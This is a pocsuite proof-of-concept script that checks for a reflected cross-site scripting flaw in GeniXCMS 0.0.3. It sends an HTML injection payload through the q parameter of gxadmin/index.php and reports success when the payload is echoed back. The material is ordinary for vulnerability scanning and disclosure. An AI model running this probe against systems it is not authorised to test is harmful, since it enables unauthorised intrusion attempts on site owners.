#!/usr/bin/env python
# coding: utf-8
# Download Link: https://www.exploit-db.com/apps/969a9a0c12a219fb5e3658eeaff4e426-GeniXCMS-v0.0.3.zip

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '89322'  # vul ID
    version = '1'
    author = 'p9k4r'
    vulDate = '2015-06-21'
    createDate = '2015-10-12'
    updateDate = '2015-10-12'
    references = 'https://packetstormsecurity.com/files/132397/GeniXCMS-0.0.3-Cross-Site-Scripting.html'
    name = 'GeniXCMS 0.0.3 - XSS Vulnerabilities'
    appPowerLink = 'http://www.genixcms.org'
    appName = 'genixcms'
    appVersion = '0.0.3'
    vulType = ' XSS '
    desc = '''
    gxadmin/index.php 页面参数 q 存在反射性XSS
    '''

    def _verify(self):
        path = self.url + "/gxadmin/index.php?page=posts&q=1'<h1>SEBUG@NET</h1>"
        res = req.get(path)
        return self.parse_verify(res)
    
    def parse_verify(self, res):
        output = Output(self)
        result = {}

        if res.status_code == 200 and '<h1>SEBUG@NET</h1>' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = res.url
            output.success(result)

        else:
            output.fail('Internet Nothing returned')

        return output

    def _attack(self):
     
        return self._verify()


register(TestPOC)
